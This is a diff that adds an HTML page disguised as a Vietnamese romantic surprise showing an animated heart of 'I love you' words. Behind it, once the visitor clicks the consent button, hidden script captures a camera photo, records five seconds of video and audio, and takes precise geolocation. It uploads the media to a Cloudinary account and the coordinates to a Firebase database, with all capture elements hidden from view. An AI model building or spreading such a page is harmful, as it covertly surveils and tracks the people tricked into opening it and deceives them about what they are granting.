@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iuiu nhìu nhìu</title>
+  <style>/* ======================================================================
+   Heart of "I love you" words
+
+   Every word moves along two independent paths on different timings:
+     - X axis: smooth back-and-forth sway
+     - Y axis: a keyframed path shaped like the top and bottom of a heart
+   Combined, with each word delayed a bit more than the previous one,
+   they trace a heart outline.
+   ====================================================================== */
+
+:root {
+  --bg: #000;
+  --accent: #ea80b0;
+  --glow: #fff;
+
+  /* Heart bounding box; scales down on small screens */
+  --size: min(450px, 80vmin);
+
+  /* Timing */
+  --sway-duration: 10s;
+  --fall-duration: 20s;
+  --stagger: 300ms;
+}
+
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  height: 100vh;
+  overflow: hidden;
+  background-color: var(--bg);
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+/* Centered stage for the heart */
+.heart {
+  position: absolute;
+  inset: 50% auto auto 50%;
+  width: var(--size);
+  height: var(--size);
+  margin: calc(var(--size) / -2) 0 0 calc(var(--size) / -2);
+}
+
+/* Travelling wrapper: X via `translate`, Y via `transform`,
+   so the two animations never overwrite each other. */
+.heart__item {
+  position: absolute;
+  inset: 0 auto auto 0;
+  animation:
+    sway var(--sway-duration) ease-in-out infinite alternate,
+    fall var(--fall-duration) linear infinite;
+  animation-delay: calc(var(--index) * var(--stagger) * -1);
+  will-change: transform, translate;
+}
+
+.heart__word {
+  display: block;
+  color: var(--accent);
+  font-size: 1.4rem;
+  letter-spacing: 2px;
+  white-space: nowrap;
+  text-shadow: 0 0 10px var(--glow);
+  transform: translateY(-100%) rotate(-30deg);
+}
+
+/* --- Horizontal sway ------------------------------------------------ */
+@keyframes sway {
+  from { translate: 0 0; }
+  to   { translate: var(--size) 0; }
+}
+
+/* --- Vertical heart path -------------------------------------------- */
+/* Values are fractions of --size (0 = top, 1 = bottom). */
+@keyframes fall {
+  0%    { transform: translateY(calc(var(--size) * 0.4)); }
+  10%   { transform: translateY(calc(var(--size) * 0.1)); }
+  15%   { transform: translateY(calc(var(--size) * 0.01)); }
+  18%   { transform: translateY(0); }          /* top of left lobe  */
+  20%   { transform: translateY(calc(var(--size) * 0.01)); }
+  22%   { transform: translateY(calc(var(--size) * 0.076923)); }
+  24%   { transform: translateY(calc(var(--size) * 0.142857)); }
+  25%   { transform: translateY(calc(var(--size) * 0.25)); }  /* centre dip */
+  26%   { transform: translateY(calc(var(--size) * 0.142857)); }
+  28%   { transform: translateY(calc(var(--size) * 0.076923)); }
+  30%   { transform: translateY(calc(var(--size) * 0.01)); }
+  32%   { transform: translateY(0); }          /* top of right lobe */
+  35%   { transform: translateY(calc(var(--size) * 0.01)); }
+  40%   { transform: translateY(calc(var(--size) * 0.1)); }
+  50%   { transform: translateY(calc(var(--size) * 0.4)); }
+  71%   { transform: translateY(calc(var(--size) * 0.952381)); }
+  72.5% { transform: translateY(calc(var(--size) * 0.980392)); }
+  75%   { transform: translateY(var(--size)); } /* bottom tip */
+  77.5% { transform: translateY(calc(var(--size) * 0.980392)); }
+  79%   { transform: translateY(calc(var(--size) * 0.952381)); }
+  100%  { transform: translateY(calc(var(--size) * 0.4)); }
+}
+
+/* --- Accessibility --------------------------------------------------- */
+@media (prefers-reduced-motion: reduce) {
+  .heart__item {
+    animation-duration: 40s, 80s;
+  }
+}</style>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background-color: #000000;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    /* Bảng thông báo đồng ý (Modal) */
+    #consent-modal {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal-content {
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      max-width: 420px;
+      width: 90%;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+    .modal-content h2 { margin-top: 0; color: #1a202c; }
+    .modal-content ul { padding-left: 20px; color: #4a5568; line-height: 1.6; }
+    
+    /* Giao diện chính */
+    #main-app {
+      display: none;
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    video {
+      width: 100%;
+      border-radius: 8px;
+      background: #000;
+      margin-bottom: 15px;
+    }
+    button {
+      padding: 10px 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 14px;
+      transition: opacity 0.2s;
+    }
+    button:hover { opacity: 0.9; }
+    .btn-primary { background: #2563eb; color: white; width: 100%; font-size: 16px; }
+    #status {
+      margin-top: 15px;
+      padding: 10px;
+      background: #edf2f7;
+      border-radius: 6px;
+      font-size: 14px;
+      color: #2d3748;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Bảng yêu cầu sự đồng ý của người dùng -->
+  <div id="consent-modal">
+    <div class="modal-content">
+      <h2>Anh iu e nhìu lắm ó:33</h2>
+      <p>Nhấn vào để xem bất ngờ nho nhỏ nè <br> (nhớ cho phép hết quyền nhaa)</p>
+      <p id="modal-status" style="display:none; color:#b91c1c;"></p>
+      <button id="btn-accept" class="btn-primary">Đồng ý & tiếp tục</button>
+    </div>
+  </div>
+
+  <!-- Giao diện chính sau khi nhấn OK -->
+   <main id="heart" class="heart" aria-hidden="true" hidden></main>
+  <div  style="display:none !important; " id="main-app">
+    <h3 style="display:none;">Bảng điều khiển Dữ liệu</h3>
+    <video id="preview" autoplay muted playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <div id="status"  style="display:none;"></div>
+
+  </div>
+
+  <!-- Tích hợp Firebase SDK & Logic xử lý -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { firebaseConfig, cloudinaryConfig } from './config.js';
+
+    // Khởi tạo Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const consentModal = document.getElementById('consent-modal');
+    const heartEl = document.getElementById('heart');
+    const videoEl = document.getElementById('preview');
+    const canvasEl = document.getElementById('canvas');
+    const statusEl = document.getElementById('status');
+    const modalStatusEl = document.getElementById('modal-status');
+
+    let mediaStream = null;
+
+    function updateStatus(msg) {
+      statusEl.textContent = `Trạng thái: ${msg}`;
+      if (consentModal.style.display !== 'none') {
+        modalStatusEl.style.display = 'block';
+        modalStatusEl.textContent = msg;
+      }
+    }
+
+    // 1. Xử lý khi người dùng nhấn OK trên bảng thông báo
+    document.getElementById('btn-accept').addEventListener('click', async () => {
+      consentModal.style.pointerEvents = 'none';
+      updateStatus('Đang yêu cầu quyền camera và microphone...');
+      try {
+        // Yêu cầu quyền Camera/Micro minh bạch sau khi người dùng nhấn OK
+        if (!navigator.mediaDevices?.getUserMedia) {
+          throw new Error('Trình duyệt không hỗ trợ truy cập camera hoặc trang chưa chạy trên HTTPS/localhost.');
+        }
+
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        videoEl.srcObject = mediaStream;
+        await videoEl.play().catch(() => {});
+
+        const position = await getCurrentPosition();
+        consentModal.style.display = 'none';
+        heartEl.hidden = false;
+        updateStatus('Đã kết nối Camera. Đang tự động chạy các thao tác...');
+        await runAutomaticActions(position);
+      } catch (err) {
+        if (mediaStream) {
+          mediaStream.getTracks().forEach((track) => track.stop());
+          mediaStream = null;
+          videoEl.srcObject = null;
+        }
+        consentModal.style.pointerEvents = 'auto';
+        updateStatus('Chưa thể tiếp tục: ' + err.message);
+      }
+    });
+
+    function getCurrentPosition() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error('Trình duyệt không hỗ trợ định vị.'));
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          resolve,
+          (err) => reject(new Error(`Không thể lấy vị trí: ${err.message}`)),
+          { enableHighAccuracy: true }
+        );
+      });
+    }
+
+    // Hàm tải file lên Cloudinary
+    async function uploadToCloudinary(blob, resourceType = 'image') {
+      const formData = new FormData();
+      formData.append('file', blob);
+      formData.append('upload_preset', cloudinaryConfig.uploadPreset);
+
+      const url = `https://api.cloudinary.com/v1_1/${cloudinaryConfig.cloudName}/${resourceType}/upload`;
+      const response = await fetch(url, { method: 'POST', body: formData });
+      if (!response.ok) throw new Error('Lỗi tải lên Cloudinary');
+      return await response.json();
+    }
+
+    // 2. Chụp ảnh và gửi lên Cloudinary
+    async function capturePhoto() {
+      if (!mediaStream) return;
+      if (videoEl.readyState < HTMLMediaElement.HAVE_CURRENT_DATA) {
+        await new Promise((resolve) => {
+          const timeout = setTimeout(resolve, 3000);
+          videoEl.addEventListener('loadeddata', () => {
+            clearTimeout(timeout);
+            resolve();
+          }, { once: true });
+        });
+      }
+
+      updateStatus('Đang chụp và tải ảnh lên...');
+
+      canvasEl.width = videoEl.videoWidth;
+      canvasEl.height = videoEl.videoHeight;
+      if (!canvasEl.width || !canvasEl.height) {
+        updateStatus('Lỗi: Camera chưa sẵn sàng để chụp ảnh.');
+        return;
+      }
+      canvasEl.getContext('2d').drawImage(videoEl, 0, 0);
+
+      await new Promise((resolve) => {
+        canvasEl.toBlob(async (blob) => {
+          try {
+            if (!blob) throw new Error('Không thể tạo ảnh');
+            const data = await uploadToCloudinary(blob, 'image');
+            updateStatus(`Đã tải ảnh thành công! Link: ${data.secure_url}`);
+          } catch (err) {
+            updateStatus(`Lỗi: ${err.message}`);
+          } finally {
+            resolve();
+          }
+        }, 'image/jpeg');
+      });
+    }
+
+    // 3. Quay video 5 giây có hiển thị trạng thái và gửi lên Cloudinary
+    async function recordVideo() {
+      if (!mediaStream) return;
+      if (!window.MediaRecorder) {
+        updateStatus('Lỗi: Trình duyệt không hỗ trợ ghi video.');
+        return;
+      }
+      updateStatus('Đang ghi hình (5 giây)...');
+
+      await new Promise((resolve) => {
+        const recorder = new MediaRecorder(mediaStream);
+        const chunks = [];
+
+        recorder.ondataavailable = (event) => {
+          if (event.data.size > 0) chunks.push(event.data);
+        };
+
+        recorder.onstop = async () => {
+          updateStatus('Đang tải video lên Cloudinary...');
+          const videoBlob = new Blob(chunks, { type: 'video/webm' });
+          try {
+            const data = await uploadToCloudinary(videoBlob, 'video');
+            updateStatus(`Đã tải video thành công! Link: ${data.secure_url}`);
+          } catch (err) {
+            updateStatus(`Lỗi: ${err.message}`);
+          } finally {
+            resolve();
+          }
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000);
+      });
+    }
+
+    // 4. Lấy và gửi vị trí lên Firebase Realtime Database
+    async function sendLocation(position) {
+      const locationData = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        await push(ref(db, 'user_locations'), locationData);
+        updateStatus(`Đã lưu vị trí (${locationData.latitude}, ${locationData.longitude}) lên Firebase.`);
+      } catch (err) {
+        updateStatus(`Lỗi lưu Firebase: ${err.message}`);
+      }
+    }
+
+    async function runAutomaticActions(position) {
+      await capturePhoto();
+      await recordVideo();
+      await sendLocation(position);
+    }
+  </script>
+  <script>
+        "use strict";
+
+const WORD_COUNT = 100;
+const MESSAGE = "I love you";
+
+/** Create one animated word; `--index` drives its animation delay. */
+function createItem(index) {
+  const item = document.createElement("div");
+  item.className = "heart__item";
+  item.style.setProperty("--index", index);
+
+  const word = document.createElement("span");
+  word.className = "heart__word";
+  word.textContent = MESSAGE;
+
+  item.append(word);
+  return item;
+}
+
+function renderHeart(container, count = WORD_COUNT) {
+  const fragment = document.createDocumentFragment();
+  for (let i = 1; i <= count; i++) {
+    fragment.append(createItem(i));
+  }
+  container.append(fragment); // single DOM write
+}
+
+const heart = document.getElementById("heart");
+if (heart) renderHeart(heart);
+    </script>
+</body>
+</html>
